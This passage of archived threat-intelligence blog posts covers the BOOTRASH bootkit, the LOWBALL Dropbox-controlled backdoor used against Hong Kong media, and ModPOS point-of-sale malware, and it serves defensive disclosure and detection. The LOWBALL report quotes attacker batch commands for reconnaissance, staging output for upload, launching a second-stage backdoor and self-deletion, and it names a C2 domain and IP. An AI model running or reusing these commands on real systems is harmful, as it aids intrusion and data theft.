      <td width=""374""><p>HKCU\.Default\Identities\{424D9649-5B57-4C9B-A55A-00D6CD382092}</p>
      </td> <td width=""100""><p>vfs.sys</p> </td> </tr>
    <tr>
      <td width=""374""><p>HKCU\.Default\Identities\{AA1F2588-670C-450E-833B-C8CAAF26DA5E}</p>
      </td> <td width=""100""><p>nemesis.sys</p> </td> </tr>
    <tr>
      <td width=""374""><p>HKCU\.Default\Identities\{95E4F335-E152-4778-B3B0-3422B37B3A3D}</p>
      </td> <td width=""100""><p>injproxy.dll</p> </td> </tr>
    <tr>
      <td width=""374""><p>HKCU\.Default\Identities\{C34C01DC-8E9D-40AF-82FF-79DB2735C333}</p>
      </td> <td width=""100""><p>loader.dll</p> </td> </tr>
    <tr>
      <td width=""374""><p>HKCU\.Default\Identities\{4EED1600-54C9-471E-B74F-2A88BAC188B4}</p>
      </td> <td width=""100""><p>nemesis.dll</p> </td> </tr>
    <tr>
      <td width=""374""><p>HKCU\.Default\Identities\{36203264-DFF1-43AC-94AD-096592297776}</p>
      </td> <td width=""100""><p>nmscfg.dat</p> </td> </tr></tbody></table>
 <p>
  <a name=""_Ref434606046""></a>Table 1: Nemesis components optionally
  saved as registry values</p>
 <h5>Step 5: Hijacked Boot Process</h5>
 <p>As previously discussed, during a normal boot process the MBR loads
  the VBR, which loads the operating system code. However, during the
  hijacked boot process, the compromised system’s MBR will attempt to
  load the boot partition’s VBR, which has been overwritten with the
  malicious BOOTRASH bootstrap code. This code loads the Nemesis bootkit
  components from the custom virtual file system. The bootkit then
  passes control to the original boot sector, which was saved to a
  different location on disk during the installation process. From this
  point the boot process continues with the loading and executing of the
  operating system software. Figure 2 illustrates the hijacked boot process.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/BOOTRASH/bootrashfig2.jpg"" /></p>
 <p>Figure 2. Simplified hijacked boot process</p>
 <p>The bootkit intercepts several system interrupts to assist with the
  injection of the primary Nemesis components during the boot process.
  The bootkit hijacks the BIOS interrupt<a name=""_ftnref6""></a>[6]
  responsible for miscellaneous system services and patches the
  associated Interrupt Vector Table entry so it can intercept memory
  queries once the operating system loader gains control. The bootkit
  then passes control to the original VBR to allow the boot process to
  continue. While the operating system is being loaded, the bootkit also
  intercepts the interrupt and scans the operating system loader memory
  for a specific instruction that transfers the CPU from real mode to
  protected mode.<a name=""_ftnref7""></a>[7] This allows the bootkit to
  patch the Interrupt Descriptor Table each time the CPU changes from
  real mode to protected mode. This patch involves a modified interrupt
  handler that redirects control to the bootkit every time a specific
  address is executed. This is what allows the bootkit to detect and
  intercept specific points of the operating system loader execution and
  inject Nemesis components as part of the normal kernel loading.</p>
 <h5>Uninstall Option</h5>
 <p>BOOTRASH has a built in option for restoring the original boot
  sector, in the event that the threat actors wish to remove the
  hijacking process. This option only restores the original boot sector
  – it does not remove the custom virtual file system or the backup VBR
  that was created by BOOTRASH.</p>
 <h5>Other Bootkits</h5>
 <p>Malware that persists by compromising the MBR or VBR is unusual, but
  not unknown. ESET documented their technical research into bootkit
  malware families such as ‘TDL4’ (also known as ‘Olmarik’), ‘Necurs’,
  and ‘Rovnix’ in 2011,<a name=""_ftnref8""></a>[8] and cataloged various
  MBR and VBR infection vectors in 2012.<a name=""_ftnref9""></a>[9]</p>
 <p>In addition, there have been reports of financially motivated
  malware utilizing bootkits. In 2013, RSA warned that a banking Trojan
  named ‘KINS’ had VBR bootkit functionality and was being advertised on
  a Russian-speaking online forum<a name=""_ftnref10""></a>[10]. There was
  also reporting in 2013 that the source code for another banking
  Trojan, known as ‘Carberp,’ was publicly leaked. Reports stated the
  Trojan had been sold for $40,000 due to the addition of bootkit
    functionality<a name=""_ftnref11""></a>[11].  Further reporting
  indicated the bootkit component might not have been completely
    operational<a name=""_ftnref12""></a>[12].  Regardless, the high price
  commanded for the malware is indicative of the bootkit code
  complexity, as well as the demand for banking malware with this
  evasive capability.</p>
 <h5>Not Just a Financial Threat</h5>
 <p>In 2012, Mandiant observed a suspected China-based, Advanced
  Persistent Threat (APT) group utilizing a MBR (as opposed to VBR)
  bootkit that we call ROCKBOOT to establish persistence for backdoors
  at victim organizations within an industry unrelated to financial
  services. This group, like many of the threat groups we track,
  primarily uses more traditional techniques for ensuring their malware
  remains persistent, such as modifying Windows registry keys or using
  techniques like DLL search order hijacking. This threat group deployed
  the bootkit as part of the toolset used to steal intellectual property
  from the victim organization.</p>
 <p>The selective use of bootkits for persistence suggests some threat
  actors may have access to more sophisticated toolsets. The threat
  actors may selectively deploy these advanced toolsets when the victim
  organization is difficult to penetrate or if the targeted data is of
  high value and the threat actors want to ensure continued access to
  the compromised environment.</p>
 <h5>Elevating Detection Capabilities</h5>
 <p>Bootkits, such as BOOTRASH, are very difficult to detect because
  they have the potential to be installed and executed almost completely
  outside of the Windows operating system.<a name=""_ftnref13""></a>[13]
  Because the malicious boot loader executes before Windows itself is
  fully loaded, it is not subject to typical operating system integrity
  checks. The components used to load the malware payload are not
  scanned by anti-virus software, because they are stored in a VFS
  outside the Windows file system. In addition, the malware components
  themselves are stored either in the VFS or the Windows registry –
  another location not typically scanned by anti-virus. This leaves live
  memory as the only location where the malware is likely to be
  detected; and unless the bootkit and VFS components are removed, the
  malware will execute and load every time the system starts. Wiping the
  operating system partition and re-installing will not remove the
  bootkit or VFS components written to unallocated space.</p>
 <p>During the investigation with BOOTRASH, we used Mandiant Intelligent
  Response (MIR), a proprietary host-based technology that provides raw
  disk access, to look for malware persistence outside of the operating
  system. This tool allowed us to identify systems that had a modified VBR.</p>
 <h5>Conclusion</h5>
 <p>The use of malware that persists outside of the operating system
  requires a different approach to detection and eradication. Malware
  with bootkit functionality can be installed and executed almost
  completely independent of the Windows operating system. As a result,
  incident responders will need tools that can access and search raw
  disks at scale for evidence of bootkits. Similarly, re-installing the
  operating system after a compromise is no longer sufficient. System
  administrators should perform a complete physical wipe of any systems
  compromised with a bootkit and then reload the operating system.</p>
 <h5>Appendix: Associated MD5 Hashes</h5>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""473""> <tbody>
    <tr>
      <td valign=""top"" width=""233""><p>
          <b>MD5 Hash</b></p> </td> <td valign=""top"" width=""240""><p>
          <b>Function</b></p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>372f1e4d2d5108bbffc750bb0909fc49</p> </td> <td valign=""top"" width=""240""><p>BOOTRASH dropper</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>ac64ef80f8209ae7b67be0be9ea6400e</p> </td> <td valign=""top"" width=""240""><p>Windows 7 and later 32-bit modified
        VBR</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>073a2998a6f1ccf0ea89fe60ce4bdeaf</p> </td> <td valign=""top"" width=""240""><p>Windows 7 and later 64-bit modified
        VBR</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>c145624f148980ad026ea7b79e61212d</p> </td> <td valign=""top"" width=""240""><p>Windows XP 32-bit modified VBR</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>472926fe51fc6a4fdf687e8a4de64d78</p> </td> <td valign=""top"" width=""240""><p>Windows XP 64-bit modified VBR</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>1c17c92519523a129e9abd298bb78521</p> </td> <td valign=""top"" width=""240""><p>Bootstrap code for systems with
        NTFS/MBR</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>15de35de527ebe2115746b4fd4f1ba1d</p> </td> <td valign=""top"" width=""240""><p>32-bit Boot loader driver</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>012e6f3ee70d6558f8002d0efce5c9e0</p> </td> <td valign=""top"" width=""240""><p>64-bit Boot loader driver</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>dd366fcb810594e0620fdf672b03f4d5</p> </td> <td valign=""top"" width=""240""><p>32-bit Core services driver</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>fed12e07499e8cd3a5a47f1f7a8db0be</p> </td> <td valign=""top"" width=""240""><p>64-bit Core services driver</p>
      </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>21cd4a30ac322bfc9bd2401ea17acfc0</p> </td> <td valign=""top"" width=""240""><p>32-bit Nemesis driver</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>76b6dc622264e3ad822a691a7ec68865</p> </td> <td valign=""top"" width=""240""><p>64-bit Nemesis driver</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>d0b9f9bccbc3725bfcc9546986982ff3</p> </td> <td valign=""top"" width=""240""><p>32-bit VFS driver</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""233""><p>efbff3b08b5d368976eb4675bb4c000f</p> </td> <td valign=""top"" width=""240""><p>64-bit VFS driver</p> </td> </tr></tbody></table>
 <p>
  <a name=""_ftn1""></a>[1] The name ‘Nemesis’ is referenced in several
  build paths for the malware.</p>
 <p>
  <a name=""_ftn2""></a>[2] https://technet.microsoft.com/en-us/library/cc976797.aspx</p>
 <p>
  <a name=""_ftn3""></a>[3] https://en.wikipedia.org/wiki/Volume_boot_record</p>
 <p>
  <a name=""_ftn4""></a>[4] http://windows.microsoft.com/en-us/windows/install-multiple-operating-system-multiboot#1TC=windows-7</p>
 <p>
  <a name=""_ftn5""></a>[5] http://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html</p>
 <p>
  <a name=""_ftn6""></a>[6] A BIOS interrupt is a hardware or software
  driven condition requiring the interruption of the current code the
  processor is executing.</p>
 <p>
  <a name=""_ftn7""></a>[7] Protected mode is an operating state that
  provides hardware-level protections for a system’s memory. Real mode
  does not provide this protection support.</p>
 <p>
  <a name=""_ftn8""></a>[8] http://www.welivesecurity.com/2011/08/23/hasta-la-vista-bootkit-exploiting-the-vbr/</p>
 <p>
  <a name=""_ftn9""></a>[9] http://www.welivesecurity.com/2012/12/27/win32gapz-new-bootkit-technique/</p>
 <p>
  <a name=""_ftn10""></a>[10] https://blogs.rsa.com/is-cybercrime-ready-to-crown-a-new-kins-inth3wild/</p>
 <p>
  <a name=""_ftn11""></a>[11] http://threatpost.com/carberp-source-code-leaked/101070/</p>
 <p>
  <a name=""_ftn12""></a>[12] http://krebsonsecurity.com/tag/carberp-bootkit/</p>
 <p>
  <a name=""_ftn13""></a>[13] Malware with bootkit functionality still
  relies on the operating system to initiate installation. However, the
  actual payload (the bootkit itself) can be allocated to disk outside
  of the operating system.</p>",http://www.fireeye.com/blog/threat-research/2015/12/fin1-targets-boot-record.html
"China-based Cyber Threat Group Uses Dropbox for Malware Communications
and Targets Hong Kong Media Outlets","<p>FireEye Threat Intelligence analysts identified a spear phishing
  campaign carried out in August 2015 targeting Hong Kong-based media
  organizations. A China-based cyber threat group, which FireEye tracks
  as an uncategorized advanced persistent threat (APT) group and other
  researchers refer to as “admin@338,” may have conducted the
    activity.<a name=""_ednref1""></a>[1] The email messages contained
  malicious documents with a malware payload called LOWBALL. LOWBALL
  abuses the Dropbox cloud storage service for command and control
  (CnC). We collaborated with Dropbox to investigate the threat, and our
  cooperation revealed what may be a second, similar operation. The
  attack is part of a trend where threat groups hide malicious activity
  by communicating with legitimate web services such as social
  networking and cloud storage sites to foil detection efforts.<a name=""_ednref2""></a>[2]<a name=""_ednref3""></a>[3]</p>
 <h3>A Cyber Campaign Likely Intended to Monitor Hong Kong Media During
  a Period of Crisis</h3>
 <p>The threat group has previously used newsworthy events as lures to
  deliver malware.<a name=""_ednref4""></a>[4] They have largely targeted
  organizations involved in financial, economic and trade policy,
  typically using publicly available RATs such as Poison Ivy, as well
  some non-public backdoors.<a name=""_ednref5""></a>[5]</p>
 <p>The group started targeting Hong Kong media companies, probably in
  response to political and economic challenges in Hong Kong and China.
  The threat group’s latest activity coincided with the announcement of
  criminal charges against democracy activists.<a name=""_ednref6""></a>[6] During the past 12 months, Chinese authorities
  have faced several challenges, including large-scale protests in Hong
  Kong in late 2014, the precipitous decline in the stock market in
  mid-2015, and the massive industrial explosion in Tianjin in August
  2015. In Hong Kong, the pro-democracy movement persists, and the
  government recently denied a professor a post because of his links to
  a pro-democracy leader.<a name=""_ednref7""></a>[7]</p>
 <p>Multiple China-based cyber threat groups have targeted international
  media organizations in the past. The targeting has often focused on
  Hong Kong-based media, particularly those that publish pro-democracy
  material. The media organizations targeted with the threat group’s
  well-crafted Chinese language lure documents are precisely those whose
  networks Beijing would seek to monitor. Cyber threat groups’ access to
  the media organization’s networks could potentially provide the
  government advance warning on upcoming protests, information on
  pro-democracy group leaders, and insights needed to disrupt activity
  on the Internet, such as what occurred in mid-2014 when several
  websites were brought down in denial of service attacks.<a name=""_ednref8""></a>[8]</p>
 <h3>
  <span class=""type-L"">Threat Actors Use Spear Phishing Written in
    Traditional Chinese Script in Attempted Intrusions</span></h3>
 <p>In August 2015, the threat actors sent spear phishing emails to a
  number of Hong Kong-based media organizations, including newspapers,
  radio, and television. The first email references the creation of a
  Christian civil society organization to coincide with the anniversary
  of the 2014 protests in Hong Kong known as the Umbrella Movement. The
  second email references a Hong Kong University alumni organization
  that fears votes in a referendum to appoint a Vice-Chancellor will be
  co-opted by pro-Beijing interests.<a name=""_ednref9""></a>[9]</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/hongkongdropbox/hongkongdropboxfig1.jpg"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Lure Screenshots</span></p>
 <p>The group’s previous activities against financial and policy
  organizations have largely focused on spear phishing emails written in
  English, destined for Western audiences. This campaign, however, is
  clearly designed for those who read the traditional Chinese script
  commonly used in Hong Kong.</p>
 <h3>
  <span class=""type-L"">LOWBALL Malware Analysis</span></h3>
 <p>The spear phishing emails contained three attachments in total, each
  of which exploited an older vulnerability in Microsoft Office (CVE-2012-0158):</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""221""><p>MD5</p> </td> <td valign=""top"" width=""221""><p>Filename</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>b9208a5b0504cb2283b1144fc455eaaa</p> </td> <td valign=""top"" width=""221""><p>使命公民運動 我們的異象.doc</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>ec19ed7cddf92984906325da59f75351</p> </td> <td valign=""top"" width=""221""><p>新聞稿及公佈.doc</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>6495b384748188188d09e9d5a0c401a4</p> </td> <td valign=""top"" width=""221""><p>(代發)[采訪通知]港大校友關注組遞信行動.doc</p> </td> </tr></tbody></table>
 <p>In all three cases, the payload was the same:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""221""><p>MD5</p> </td> <td valign=""top"" width=""221""><p>Filename</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>d76261ba3b624933a6ebb5dd73758db4</p> </td> <td valign=""top"" width=""221""><p>time.exe</p> </td> </tr></tbody></table>
 <p>This backdoor, known as LOWBALL, uses the legitimate Dropbox
  cloud-storage<br /> service to act as the CnC server. It uses the
  Dropbox API with a hardcoded bearer access token and has the ability
  to download, upload, and execute files. The communication occurs via
  HTTPS over port 443.</p>
 <p>After execution, the malware will use the Dropbox API to make an
  HTTP GET request using HTTPS over TCP port 443 for the files:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""221""><p>MD5</p> </td> <td valign=""top"" width=""221""><p>Filename</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>d76261ba3b624933a6ebb5dd73758db4</p> </td> <td valign=""top"" width=""221""><p>WmiApCom</p> </td> </tr>
    <tr>
      <td valign=""top"" width=""221""><p>79b68cdd0044edd4fbf8067b22878644</p> </td> <td valign=""top"" width=""221""><p>WmiApCom.bat</p> </td> </tr></tbody></table>
 <p>The “WmiApCom.bat” file is simply used to start “WmiApCom”, which
  happens to be the exact same file as the one dropped by the malicious
  Word documents. However, this is most likely meant to be a mechanism
  to update the compromised host with a new version of the LOWBALL malware.</p>
 <p>The threat group monitors its Dropbox account for responses from
  compromised computers. Once the LOWBALL malware calls back to the
  Dropbox account, the attackers will create a file called
  “[COMPUTER_NAME]_upload.bat” which contains commands to be executed on
  the compromised computer. This batch file is then executed on the
  target computer, with the results uploaded to the attackers’ Dropbox
  account in a file named “[COMPUTER_NAME]_download”.</p>
 <p>We observed the threat group issue the following commands:</p>
 <table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%""> <tbody>
    <tr>
      <td valign=""top""><p>@echo off </p> </td> </tr>
    <tr>
      <td valign=""top""><p> dir c:\ &gt;&gt; %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> ipconfig /all &gt;&gt; %temp%\download </p>
      </td> </tr>
    <tr>
      <td valign=""top""><p> net user &gt;&gt; %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> net user /domain &gt;&gt;
        %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> ver &gt;&gt; %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> del %0  </p> </td> </tr>
    <tr>
      <td valign=""top""><p>@echo off </p> </td> </tr>
    <tr>
      <td valign=""top""><p> dir &quot;c:\Documents and Settings&quot;
          &gt;&gt; %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> dir &quot;c:\Program Files\ </p> </td> </tr>
    <tr>
      <td valign=""top""><p> &quot; &gt;&gt; %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> net start &gt;&gt; %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> net localgroup administrator &gt;&gt;
        %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> netstat -ano &gt;&gt; %temp%\download</p>
      </td> </tr></tbody></table>
 <p>These commands allow the threat group to gain information about the
  compromised computer and the network to which it belongs. Using this
  information, they can decide to explore further or instruct the
  compromised computer to download additional malware.</p>
 <p>We observed the threat group upload a second stage malware, known as
  BUBBLEWRAP (also known as Backdoor.APT.FakeWinHTTPHelper) to their
  Dropbox account along with the following command:</p>
 <table border=""0"" cellpadding=""0"" cellspacing=""0"" width=""100%""> <tbody>
    <tr>
      <td valign=""top""><p>@echo off </p> </td> </tr>
    <tr>
      <td valign=""top""><p> ren &quot;%temp%\upload&quot;
        audiodg.exe </p> </td> </tr>
    <tr>
      <td valign=""top""><p> start %temp%\audiodg.exe </p> </td> </tr>
    <tr>
      <td valign=""top""><p> dir d:\ &gt;&gt; %temp%\download </p> </td> </tr>
    <tr>
      <td valign=""top""><p> systeminfo &gt;&gt; %temp%\download </p>
      </td> </tr>
    <tr>
      <td valign=""top""><p> del %0  </p> </td> </tr></tbody></table>
 <p>We have previously observed the admin@338 group use BUBBLEWRAP. This
  particular sample connected to the CnC domain accounts.serveftp[.]com,
  which resolved to an IP address previously used by the threat group,
  although the IP had not been used for some time prior to this most
  recent activity:</p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0""> <tbody>
    <tr>
      <td valign=""top"" width=""148""><p>MD5</p> </td> <td valign=""top"" width=""148""><p> </p> </td> <td valign=""top"" width=""148""><p> </p> </td> </tr>
    <tr>
      <td valign=""top"" width=""148""><p>0beb957923df2c885d29a9c1743dd94b</p> </td> <td valign=""top"" width=""148""><p>accounts.serveftp.com</p> </td> <td valign=""top"" width=""148""><p>59.188.0.197</p> </td> </tr></tbody></table>
 <p>BUBBLEWRAP is a full-featured backdoor that is set to run when the
  system boots, and can communicate using HTTP, HTTPS, or a SOCKS proxy.
  This backdoor collects system information, including the operating
  system version and hostname, and includes functionality to check,
  upload, and register plugins that can further enhance its capabilities.</p>
 <h3>
  <span class=""type-L"">A Second Operation</span></h3>
 <p>FireEye works closely with security researchers and industry
  partners to mitigate cyber threats, and we collaborated with Dropbox
  to respond to this activity. The Dropbox security team was able to
  identify this abuse and put countermeasures in place.</p>
 <p>Our cooperation uncovered what appears to be a second, ongoing
  operation, though we lack sufficient evidence to verify if admin@338
  is behind it. The attack lifecycle followed the same pattern, though
  some of the filenames were different, which indicates that there may
  be multiple versions of the malware. In addition, while the operation
  targeting Hong Kong-based media involved a smaller number of targets
  and a limited duration, we suspect this second operation involves up
  to 50 targets. At this time, we are unable to identify the victims.</p>
 <p>In this case, after the payload is delivered via an exploit the
  threat actor places files (named upload.bat, upload.rar, and
  period.txt, download.txt or silent.txt) in a directory on a Dropbox
  account. The malware beacons to this directory using the hardcoded API
  token and attempts to download these files (which are deleted from the
  Dropbox account after the download):</p>
 <ul> <li>upload.bat, a batch script that the compromised machine will
  execute</li> <li>upload.rar, a RAR archive that contains at least two
    files: a batch script to execute, and often an executable (sometimes
    named rar.exe)  which the batch script will run and almost always
    uploads the results of download.rar to the cloud storage
  account</li> <li>silent.txt and period.txt,  small files sizes of 0-4
    bytes that dictate the frequency to check in with the CnC</li> </ul>
 <p>The threat actor will then download the results and then delete the
  files from the cloud storage account.</p>
 <h1>
  <span class=""type-L"">Conclusion</span></h1>
 <p>LOWBALL is an example of malware that abuses cloud storage services
  to mask its activity from network defenders. The LOWBALL first stage
  malware allows the group to collect information from victims and then
  deliver the BUBBLEWRAP second stage malware to their victims after
  verifying that they are indeed interesting targets.</p>
 <p>
  <i>A version of this article appeared first on the </i>
  <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/products/pdfs/pf/intel/ds-fireeye-intelligence-center.pdf""><i>FireEye
      Intelligence Center</i></a>
  <i>. The FireEye Intelligence Center provides access to strategic
    intelligence, analysis tools, intelligence sharing capabilities, and
    institutional knowledge based on over 10 years of FireEye and
    Mandiant experience detecting, responding to and tracking advanced
    threats. FireEye uses a proprietary intelligence database, along
    with the expertise of our Threat Intelligence Analysts, to power the
    Intelligence Center.</i></p>
 <p>
  <a name=""_edn1""></a>[1] FireEye currently tracks this activity as an
  “uncategorized” group, a cluster of related threat activity about
  which we lack information to classify with an advanced persistent
  threat number.</p>
 <p>
  <a name=""_edn2""></a>[2] FireEye. Hiding in Plain Sight: FireEye and
  Microsoft Expose Obfuscation Tactic. <a href=""https://www2.fireeye.com/rs/fireye/images/APT17_Report.pdf"">https://www2.fireeye.com/rs/fireye/images/APT17_Report.pdf</a></p>
 <p>
  <a name=""_edn3""></a>[3] FireEye. <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/07/hammertoss_stealthy.html"">HAMMERTOSS:
    Stealthy Tactics Define a Russian Cyber Threat Group</a>.  </p>
 <p>
  <a name=""_edn4""></a>[4] Moran, Ned and Alex Lanstein. FireEye. “Spear
  Phishing the News Cycle: APT Actors Leverage Interest in the
  Disappearance of Malaysian Flight MH 370.” 25 March 2014. https://www.fireeye.com/blog/threat-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-malaysian-flight-mh-370.html.</p>
 <p>
  <a name=""_edn5""></a>[5] Moran, Ned and Thoufique Haq. FireEye. “<a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2013/10/know-your-enemy-tracking-a-rapidly-evolving-apt-actor.html"">Know
    Your Enemy: Tracking a Rapidly Evolving APT Actor</a>.” 31 October
  2013. <a href=""https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf."">FireEye.
    Poison Ivy: Assessing Damage and Extracting Intelligence</a></p>
 <p>
  <a name=""_edn6""></a>[6] BBC News. “Hong Kong student leaders charged
  over Umbrella Movement.’” 27 August 2015. http://www.bbc.com/news/world-asia-china-34070695.</p>
 <p>
  <a name=""_edn7""></a>[7] Zhao, Shirley, Joyce Ng, and Gloria Chan.
  “University of Hong Kong’s council votes 12-8 to reject Johannes
  Chan’s appointment as pro-vice-chancellor.” 30 September 2015. http://www.scmp.com/news/hong-kong/education-community/article/1862423/surprise-move-chair-university-hong-kong.</p>
 <p>
  <a name=""_edn8""></a>[8] Wong, Alan. Pro-Democracy Media Company’s
  Websites Attacked.  “Pro-Democracy Media Company’s Websites Attacked.”
  New York Times. 18 June 2014. http://sinosphere.blogs.nytimes.com/2014/06/18/pro-democracy-media-companys-websites-attacked/.</p>
 <p>
  <a name=""_edn9""></a>[9] “HKU concern group raises proxy fears in key
  vote.” EIJ Insight. 31 August 2015. http://www.ejinsight.com/20150831-hku-concern-group-raises-proxy-fears-in-key-vote/.</p>
 <p> </p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html
"ModPOS: Highly-Sophisticated, Stealthy Malware Targeting US POS Systems
with High Likelihood of Broader Campaigns","<div class=""c00 c00v1"" style=""text-align: center;"">
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/isight/isight_partners_modpos_blog_image.jpg"" />
  <br /> <p style=""text-align: left;"">
    <br /> Today, iSIGHT Partners is sharing details about a highly
    sophisticated criminal malware framework that has been used to
    target point-of-sale (POS) systems at US-based retailers. We believe
    this very hard to detect malware is likely being used in broader
    campaigns and are disclosing details to help retailers and other
    organizations with POS and other payment processing systems hunt for
    and eradicate the malware.</p> <p style=""text-align: left;"">iSIGHT
    Partners has already briefed numerous retailers and other
    organizations that are involved with payment systems, and our
    experts are also actively working with the Retail Cyber Intelligence
    Sharing Center (<a href=""https://r-cisc.org/"" target=""_blank"">R-CISC</a>) to help its members detect and stop this
    virulent malware.</p> <p style=""text-align: left;"">You will find a
    summary of ModPOS below, or <a href=""http://info.isightpartners.com/ModPOS-malware-disclosure-report"">download
      the full Intelligence Report with Indicators</a> here.</p> <p style=""text-align: left;"">We are hosting two webinars to review
    details and answer questions about ModPOS.</p> <ul> <li style=""text-align: left;"">Join our Webinar Nov 25, 2015 <a href=""http://info.isightpartners.com/ModPOS-malware-disclosure-webinar-10am"" target=""_blank"">@ 10AM Eastern Standard Time</a></li> <li style=""text-align: left;"">Join our Webinar Nov 25, 2015 <a href=""http://info.isightpartners.com/ModPOS-malware-disclosure-webinar-2pm"" target=""_blank"">@ 2PM Eastern Standard Time</a></li> </ul> <p style=""text-align: left;"">For any media related inquires on ModPOS,
    please contactStephen Ward, <a href=""mailto:sward@isightpartners.com"">sward@isightpartners.com</a>.</p>
    <h3 style=""text-align: left;"">Here is what you need to know...</h3>
    <h5 style=""text-align: left;"">WHAT IS THE NEWS?</h5> <p style=""text-align: left;"">The threat intelligence experts at iSIGHT
    Partners have analyzed the most sophisticated point-of-sale (POS)
    malware we have seen to date. ModPOS, which is short for modular
    point-of-sale (POS) system, is a comprehensive malware framework.
    The actors behind the ModPOS software have exhibited a very
    professional level of software development proficiency, creating a
    complex, highly functional and modular code base that places a very
    heavy emphasis on obfuscation and persistence. Thus, ModPOS can go
    undetected by numerous types of modern security defenses.</p> <p style=""text-align: left;"">ModPOS is highly modular and can be
    configured to target specific systems with components such as
    uploader/downloader, keylogger, POS RAM scraper and custom plugins
    for credential theft and other specialized functions like network
    reconnaissance. We believe other capabilities could also be
    leveraged. The modules are packed kernel drivers that use multiple
    methods of obfuscation and encryption to evade even the most
    sophisticated security controls.</p> <p style=""text-align: left;"">We
    know that US retailers have been targeted and believe it is very
    likely that criminal actors are seeking to compromise additional
    victims beyond those identified. We observed a small element of the
    ModPOS framework as far back as 2012, with known activity in late
    2013 and active targeting of US retailers through 2014. Given its
    sophistication, it has taken our malware analysis ninjas a
    substantial amount of time to reverse engineer the software.</p>
    <img src=""https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/isight/iSIGHT-Partners-ModPOS-timeline-20nov2015-680x354.png"" />
  <br /> <p style=""text-align: left;"">
    <br /> While attribution is always a difficult proposition, we have
    some indication that the ModPOS malware may have ties to Eastern
    Europe. This belief is based on IP addresses resolving to this
    region in samples we reverse engineered and other factors we are not
  disclosing.</p> <p style=""text-align: left;"">In a nutshell, this is
    not your daddy's run-of-the-mill cyber crime malware.</p> <h4 style=""text-align: left;"">WE USE EMV/CHIP-and-PIN TECHNOLOGY SO
    WE'RE COVERED. RIGHT?</h4> <p style=""text-align: left;"">The use of
    EMV technology itself does not ensure that POS systems and card data
    are fully protected in all circumstances. EMV was designed to make
    it very difficult for malicious actors to manufacture perfect clones
    using stolen card data and is a key element in protecting the card
    system in toto. However, if the system configuration does not
    support end-to-end encryption, including encrypting data in memory,
    then ModPOS and other malware with RAM scraping techniques can still
    gain access to card data. Criminals can then reuse card data, even
    from EMV cards, to make online (card-not-present) transactions.</p>
    <h4 style=""text-align: left;"">WHY ARE YOU MAKING THIS AVAILABLE TO
    THE PUBLIC?</h4> <p style=""text-align: left;"">We are making the
    ModPOS details and technical indicators publicly available in an
    effort to protect future victims and provide retailers and other POS
    and payment system operators the information they need to hunt for
    the ModPOS malware in their environments.</p> <h4 style=""text-align: left;"">WHO IS ISIGHT PARTNERS?</h4> <p style=""text-align: left;"">Dallas-based iSIGHT Partners is a global
    cyber intelligence firm that delivers cyber threat intelligence and
    insight to leading enterprises in business and government. With 300+
    experts in 18 countries and expertise in 29 languages, only iSIGHT
    Partners can deliver the full context and intent of our clients'
    most dangerous cyber adversaries, allowing security organizations to
    respond faster, defend proactively and invest smarter. With iSIGHT
    Partners, enterprises can deploy their defenses more efficiently and
    effectively, and internal security professionals can more accurately
    quantify the return on security investments for senior
  management.</p> </div>",http://www.fireeye.com/blog/threat-research/2015/11/modpos.html
